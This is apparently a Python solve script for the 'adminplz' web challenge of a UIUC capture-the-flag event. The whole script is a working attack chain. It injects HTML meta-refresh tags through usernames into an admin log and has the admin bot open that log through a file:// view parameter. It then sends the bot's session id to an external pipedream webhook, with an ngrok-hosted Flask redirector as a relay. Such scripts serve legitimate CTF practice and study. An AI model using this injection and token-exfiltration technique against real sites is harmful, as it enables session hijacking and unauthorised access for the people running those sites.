from time import sleep
import requests
from urllib.parse import urljoin, quote_plus
from multiprocessing import Process
from flask import Flask, redirect

PORT = 4444
LOGFILE = "file:///var/log/adminplz/latest.log"

URL = "https://inst-f98abff4ddb40274.adminplz.chal.uiuc.tf/"
# URL = "http://localhost/"
WEBHOOK = "https://eo154vc30u5qsfr.m.pipedream.net"
NGROK = "https://699e-112-215-220-142.ngrok-free.app"
# NGROK = f"http://172.17.0.1:{PORT}/"


app = Flask(__name__)


class API:
    def __init__(self, url=URL) -> None:
        self.url = url
        self.s = requests.Session()

    def join(s, path):
        return urljoin(s.url, path)

    def login(s, username):
        return s.s.post(s.join("/login"), data={
            "username": username,
            "password": "x"
        })

    def report(s, url):
        return s.s.post(s.join("/report"), data={"url": url})

    def admin(s, view):
        return s.s.get(s.join("/admin"), params={"view": view})


@app.route("/")
def heitunggu():
    return redirect(urljoin("http://127.0.0.1:8080", "/admin?view=" + quote_plus(LOGFILE)))


def run_flask_app():
    app.run("0.0.0.0", PORT, threaded=True)


if __name__ == "__main__":
    flask_process = Process(target=run_flask_app)
    flask_process.start()
    api = API()

    # make username with meta tag to sleep and redirect to heitunggu page
    api.login(f"<meta http-equiv='refresh' content='10;URL={NGROK}'>")
    # trigger the log
    api.admin("flag.html")

    # trigger bot admin to visiting the '/admin?view=<LOGFILE>#flag' to trigger
    # logging that will print the session id
    toreport = urljoin("http://127.0.0.1:8080", "/admin") + \
        "?view="+quote_plus(LOGFILE+"#flag")
    print("url;", toreport)
    res = api.report(toreport)
    print(res.text)

    # make username with meta tag to steal the session id
    api.login(f"<meta http-equiv='refresh' content='0;URL={WEBHOOK}/?a=")
    # trigger the log
    api.admin("flag.html")

    # waiting admin to complete the request
    sleep(2)

    # make username with closing tag
    api.login("'>")
    # trigger the log
    api.admin("flag.html")

    flask_process.join()